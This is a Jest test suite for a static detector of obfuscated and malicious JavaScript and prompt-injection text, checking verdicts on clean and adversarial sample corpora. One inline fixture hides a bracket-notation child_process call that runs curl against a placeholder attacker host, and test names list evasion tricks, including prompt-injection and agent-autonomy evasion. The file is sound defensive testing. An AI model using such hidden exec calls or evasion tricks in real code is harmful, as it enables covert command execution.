'use strict';

const evasion = require('../index');
const cleanSamples = require('./clean_corpus');
const evasionSamples = require('./adversarial_corpus');

describe('Sentinel Evasion Detector', () => {

  describe('Clean code corpus (no false positives)', () => {
    const results = [];
    for (const [name, code] of Object.entries(cleanSamples)) {
      const result = evasion.analyze(code, `${name}.js`);
      results.push({ name, result });
    }

    for (const { name, result } of results) {
      // unitTestEval intentionally flagged (eval always CRITICAL), npmScript intentionally flagged (postinstall SUSPICIOUS)
      if (name === 'unitTestEval' || name === 'npmScript') continue;
      test(`${name} should have verdict CLEAN or INFO`, () => {
        expect(['CLEAN', 'INFO']).toContain(result.verdict);
      });
    }

    test('total clean findings should be 0 for samples that should be clean', () => {
      const totalFindings = results
        .filter(r => r.name !== 'unitTestEval' && r.name !== 'npmScript')
        .reduce((s, r) => s + r.result.summary.totalFindings, 0);
      expect(totalFindings).toBe(0);
    });

    test('expressServer should be CLEAN', () => {
      const r = evasion.analyze(cleanSamples.expressServer, 'server.js');
      expect(r.verdict).toBe('CLEAN');
    });

    test('asyncFileRead should be CLEAN', () => {
      const r = evasion.analyze(cleanSamples.asyncFileRead, 'read.js');
      expect(r.verdict).toBe('CLEAN');
    });

    test('buildScript should be CLEAN (execSync for build is legitimate)', () => {
      const r = evasion.analyze(cleanSamples.buildScript, 'build.js');
      expect(r.verdict).toBe('CLEAN');
    });

    test('unitTestEval should be CRITICAL (eval is always flagged regardless of context)', () => {
      const r = evasion.analyze(cleanSamples.unitTestEval, 'test.js');
      expect(r.verdict).toBe('CRITICAL');
      expect(r.findings.some(f => f.id === 'EVASION-013')).toBe(true);
    });

    test('base64ImageData should be CLEAN (data URIs excluded from entropy)', () => {
      const r = evasion.analyze(cleanSamples.base64ImageData, 'image.js');
      expect(r.verdict).toBe('CLEAN');
    });

    test('setTimeoutDelay should be CLEAN', () => {
      const r = evasion.analyze(cleanSamples.setTimeoutDelay, 'debounce.js');
      expect(r.verdict).toBe('CLEAN');
    });

    test('requireMultiple should be CLEAN (legitimate packages not typosquatting)', () => {
      const r = evasion.analyze(cleanSamples.requireMultiple, 'deps.js');
      expect(r.verdict).toBe('CLEAN');
    });

    test('cryptoHashing should be CLEAN', () => {
      const r = evasion.analyze(cleanSamples.cryptoHashing, 'crypto.js');
      expect(r.verdict).toBe('CLEAN');
    });

    test('axiosRequest should be CLEAN', () => {
      const r = evasion.analyze(cleanSamples.axiosRequest, 'fetch.js');
      expect(r.verdict).toBe('CLEAN');
    });

    test('npmScript should be SUSPICIOUS (postinstall is a legitimate supply chain vector)', () => {
      const r = evasion.analyze(cleanSamples.npmScript, 'package.json');
      expect(r.verdict).toBe('SUSPICIOUS');
      expect(r.findings.some(f => f.id === 'EVASION-025')).toBe(true);
    });

    test('envConfig should be CLEAN', () => {
      const r = evasion.analyze(cleanSamples.envConfig, 'config.js');
      expect(r.verdict).toBe('CLEAN');
    });

    test('lodashTemplate should be CLEAN', () => {
      const r = evasion.analyze(cleanSamples.lodashTemplate, 'template.js');
      expect(r.verdict).toBe('CLEAN');
    });

    test('tryCatchRequire should be CLEAN', () => {
      const r = evasion.analyze(cleanSamples.tryCatchRequire, 'optional.js');
      expect(r.verdict).toBe('CLEAN');
    });

    test('promiseAll should be CLEAN', () => {
      const r = evasion.analyze(cleanSamples.promiseAll, 'async.js');
      expect(r.verdict).toBe('CLEAN');
    });

    test('httpServer should be CLEAN', () => {
      const r = evasion.analyze(cleanSamples.httpServer, 'http.js');
      expect(r.verdict).toBe('CLEAN');
    });

    test('classComponent should be CLEAN', () => {
      const r = evasion.analyze(cleanSamples.classComponent, 'service.js');
      expect(r.verdict).toBe('CLEAN');
    });

    test('reactSetState should be CLEAN', () => {
      const r = evasion.analyze(cleanSamples.reactSetState, 'counter.js');
      expect(r.verdict).toBe('CLEAN');
    });

    test('webpackConfig should be CLEAN', () => {
      const r = evasion.analyze(cleanSamples.webpackConfig, 'webpack.config.js');
      expect(r.verdict).toBe('CLEAN');
    });

    test('dotenvUsage should be CLEAN', () => {
      const r = evasion.analyze(cleanSamples.dotenvUsage, 'app.js');
      expect(r.verdict).toBe('CLEAN');
    });

    test('graphqlSchema should be CLEAN', () => {
      const r = evasion.analyze(cleanSamples.graphqlSchema, 'schema.js');
      expect(r.verdict).toBe('CLEAN');
    });
  });

  describe('Adversarial corpus (evasions must be detected)', () => {

    test('bracketNotationExec should be detected', () => {
      const r = evasion.analyze(evasionSamples.bracketNotationExec, 'evil.js');
      expect(r.verdict).not.toBe('CLEAN');
      expect(r.summary.totalFindings).toBeGreaterThanOrEqual(1);
      expect(r.findings.some(f => f.id === 'EVASION-001')).toBe(true);
    });

    test('stringConcatRequire should be detected', () => {
      const r = evasion.analyze(evasionSamples.stringConcatRequire, 'evil.js');
      expect(r.verdict).not.toBe('CLEAN');
      expect(r.findings.some(f => f.id === 'EVASION-002')).toBe(true);
    });

    test('stringConcatChained should be detected', () => {
      const r = evasion.analyze(evasionSamples.stringConcatChained, 'evil.js');
      expect(r.verdict).not.toBe('CLEAN');
    });

    test('hexEscapedRequire should be detected', () => {
      const r = evasion.analyze(evasionSamples.hexEscapedRequire, 'evil.js');
      expect(r.verdict).not.toBe('CLEAN');
      expect(r.findings.some(f => f.id === 'EVASION-003')).toBe(true);
    });

    test('unicodeEscapedRequire should be detected', () => {
      const r = evasion.analyze(evasionSamples.unicodeEscapedRequire, 'evil.js');
      expect(r.verdict).not.toBe('CLEAN');
      expect(r.findings.some(f => f.id === 'EVASION-004')).toBe(true);
    });

    test('evalDirect should be detected', () => {
      const r = evasion.analyze(evasionSamples.evalDirect, 'evil.js');
      expect(r.findings.some(f => f.id === 'EVASION-013')).toBe(true);
    });

    test('evalDecode should be detected (multi-layer)', () => {
      const r = evasion.analyze(evasionSamples.evalDecode, 'evil.js');
      expect(r.verdict).toBe('CRITICAL');
      expect(r.findings.some(f => f.id === 'SIG-003')).toBe(true);
    });

    test('functionConstructor should be detected', () => {
      const r = evasion.analyze(evasionSamples.functionConstructor, 'evil.js');
      expect(r.findings.some(f => f.id === 'EVASION-014' || f.id === 'EVASION-014b')).toBe(true);
    });

    test('constructorChain should be detected', () => {
      const r = evasion.analyze(evasionSamples.constructorChain, 'evil.js');
      expect(r.findings.some(f => f.id === 'EVASION-007')).toBe(true);
    });

    test('globalThisReflect should be detected', () => {
      const r = evasion.analyze(evasionSamples.globalThisReflect, 'evil.js');
      expect(r.findings.some(f => f.id === 'EVASION-017')).toBe(true);
    });

    test('shellPivot should be detected', () => {
      const r = evasion.analyze(evasionSamples.shellPivot, 'evil.sh');
      expect(r.findings.some(f => f.id === 'EVASION-012')).toBe(true);
    });

    test('vmEscape should be detected', () => {
      const r = evasion.analyze(evasionSamples.vmEscape, 'evil.js');
      expect(r.findings.some(f => f.id === 'EVASION-015')).toBe(true);
    });

    test('moduleConstructor should be detected', () => {
      const r = evasion.analyze(evasionSamples.moduleConstructor, 'evil.js');
      expect(r.findings.some(f => f.id === 'EVASION-016')).toBe(true);
    });

    test('workerThreads should be detected', () => {
      const r = evasion.analyze(evasionSamples.workerThreads, 'evil.js');
      expect(r.findings.some(f => f.id === 'EVASION-035')).toBe(true);
    });

    test('dynamicRequire should be detected', () => {
      const r = evasion.analyze(evasionSamples.dynamicRequire, 'evil.js');
      expect(r.findings.some(f => f.id === 'EVASION-028')).toBe(true);
    });

    test('prototypePollution should be detected', () => {
      const r = evasion.analyze(evasionSamples.prototypePollution, 'evil.js');
      expect(r.findings.some(f => f.id === 'EVASION-027')).toBe(true);
    });

    test('promptInjectIgnore should be detected', () => {
      const r = evasion.analyze(evasionSamples.promptInjectIgnore, 'prompt.txt');
      expect(r.findings.some(f => f.id === 'EVASION-008')).toBe(true);
    });

    test('promptInjectSystemMarker should be detected', () => {
      const r = evasion.analyze(evasionSamples.promptInjectSystemMarker, 'prompt.txt');
      expect(r.findings.some(f => f.id === 'EVASION-009')).toBe(true);
    });

    test('promptToolMisuse should be detected', () => {
      const r = evasion.analyze(evasionSamples.promptToolMisuse, 'prompt.txt');
      expect(r.findings.some(f => f.id === 'EVASION-010')).toBe(true);
    });

    test('agentAutonomyEvasion should be detected', () => {
      const r = evasion.analyze(evasionSamples.agentAutonomyEvasion, 'prompt.txt');
      expect(r.findings.some(f => f.source === 'SEMANTIC')).toBe(true);
    });

    test('codeSynthesis should be detected', () => {
      const r = evasion.analyze(evasionSamples.codeSynthesis, 'prompt.txt');
      expect(r.findings.some(f => f.id === 'SEM-009')).toBe(true);
    });

    test('jsonRpcInjection should be detected', () => {
      const r = evasion.analyze(evasionSamples.jsonRpcInjection, 'payload.json');
      expect(r.findings.some(f => f.id === 'EVASION-018')).toBe(true);
    });

    test('multiLayerDecode should be detected', () => {
      const r = evasion.analyze(evasionSamples.multiLayerDecode, 'evil.js');
      expect(r.findings.some(f => f.id === 'EVASION-020')).toBe(true);
    });

    test('outboundFetch should be detected', () => {
      const r = evasion.analyze(evasionSamples.outboundFetch, 'evil.js');
      expect(r.findings.some(f => f.id === 'EVASION-021')).toBe(true);
    });

    test('outboundWebSocket should be detected', () => {
      const r = evasion.analyze(evasionSamples.outboundWebSocket, 'evil.js');
      expect(r.findings.some(f => f.id === 'EVASION-022')).toBe(true);
    });

    test('obfuscatedIdentifiers should be detected', () => {
      const r = evasion.analyze(evasionSamples.obfuscatedIdentifiers, 'evil.js');
      expect(r.findings.some(f => f.id === 'EVASION-005')).toBe(true);
    });

    test('hardcodedSecret should be detected', () => {
      const r = evasion.analyze(evasionSamples.hardcodedSecret, 'config.js');
      expect(r.findings.some(f => f.id === 'EVASION-023')).toBe(true);
    });

    test('maliciousLifecycle should be detected', () => {
      const r = evasion.analyze(evasionSamples.maliciousLifecycle, 'package.json');
      expect(r.findings.some(f => f.id === 'EVASION-025')).toBe(true);
    });

    test('suspiciousRegistry should be detected', () => {
      const r = evasion.analyze(evasionSamples.suspiciousRegistry, '.npmrc');
      expect(r.findings.some(f => f.id === 'EVASION-026')).toBe(true);
    });

    test('obfuscatorIoPattern should be detected', () => {
      const r = evasion.analyze(evasionSamples.obfuscatorIoPattern, 'obfuscated.js');
      const detectedSig = r.findings.some(f => f.id === 'SIG-001' || f.id === 'SIG-002');
      expect(detectedSig).toBe(true);
    });

    test('delayedExecString should be detected', () => {
      const r = evasion.analyze(evasionSamples.delayedExecString, 'evil.js');
      expect(r.findings.some(f => f.id === 'EVASION-031')).toBe(true);
    });

    test('setImmediateString should be detected', () => {
      const r = evasion.analyze(evasionSamples.setImmediateString, 'evil.js');
      expect(r.findings.some(f => f.id === 'EVASION-032')).toBe(true);
    });

    test('bracketNotationSpawn should be detected via IR (variable bracket access resolved)', () => {
      const r = evasion.analyze(evasionSamples.bracketNotationSpawn, 'evil.js');
      expect(r.verdict).not.toBe('CLEAN');
      expect(r.findings.some(f => f.id === 'IR-001')).toBe(true);
    });

    test('arrayPropertyObfuscation should be detected via IR (array-indexed method resolution)', () => {
      const r = evasion.analyze(evasionSamples.arrayPropertyObfuscation, 'evil.js');
      expect(r.verdict).not.toBe('CLEAN');
      expect(r.findings.some(f => f.id === 'IR-002')).toBe(true);
    });
  });

  describe('Edge cases', () => {

    test('empty string should return CLEAN', () => {
      const r = evasion.analyze('', 'empty.js');
      expect(r.verdict).toBe('CLEAN');
      expect(r.summary.totalFindings).toBe(0);
    });

    test('null should return CLEAN', () => {
      const r = evasion.analyze(null, 'null.js');
      expect(r.verdict).toBe('CLEAN');
    });

    test('undefined should return CLEAN', () => {
      const r = evasion.analyze(undefined, 'undefined.js');
      expect(r.verdict).toBe('CLEAN');
    });

    test('single character should be CLEAN', () => {
      const r = evasion.analyze('a', 'tiny.js');
      expect(r.verdict).toBe('CLEAN');
    });

    test('very long clean code should not crash', () => {
      const code = Array(10000).fill('const x = 1;').join('\n');
      const r = evasion.analyze(code, 'big.js');
      expect(r.verdict).toBe('CLEAN');
    });

    test('mixed legitimate + malicious should detect malicious parts', () => {
      const code = `
        const express = require('express');
        const app = express();
        app.get('/', (req, res) => res.send('ok'));
        // hidden evil
        const cp = require('child_process');
        cp['exec']('curl evil.com');
      `;
      const r = evasion.analyze(code, 'mixed.js');
      expect(r.findings.some(f => f.id === 'EVASION-001')).toBe(true);
      expect(r.findings.some(f => f.source === 'HEURISTIC')).toBe(true);
    });
  });

  describe('Taxonomy integrity', () => {

    test('every technique maps to a valid taxonomy entry', () => {
      const kb = evasion.knowledgeBase;
      for (const tech of kb.techniques) {
        const taxon = kb.taxonomy.find(t => t.id === tech.taxonomyId);
        expect(taxon).toBeTruthy();
      }
    });

    test('every taxonomy techniqueId has a real technique', () => {
      const kb = evasion.knowledgeBase;
      for (const taxon of kb.taxonomy) {
        for (const techId of taxon.techniqueIds) {
          const tech = kb.techniques.find(t => t.id === techId);
          expect(tech).toBeTruthy();
        }
      }
    });

    test('every technique has a regressionTest defined', () => {
      const kb = evasion.knowledgeBase;
      for (const tech of kb.techniques) {
        expect(tech.regressionTest).toBeTruthy();
        expect(typeof tech.regressionTest).toBe('string');
        expect(tech.regressionTest.length).toBeGreaterThan(0);
      }
    });

    test('shannonEntropy is exported correctly', () => {
      const entropy = evasion.shannonEntropy('abc');
      expect(typeof entropy).toBe('number');
      expect(entropy).toBeGreaterThan(0);
    });

    test('knowledgeBase is loaded', () => {
      expect(evasion.knowledgeBase).toBeDefined();
      expect(evasion.knowledgeBase.version).toBe('2.0.0');
      expect(evasion.knowledgeBase.techniques.length).toBe(53);
    });
  });
});
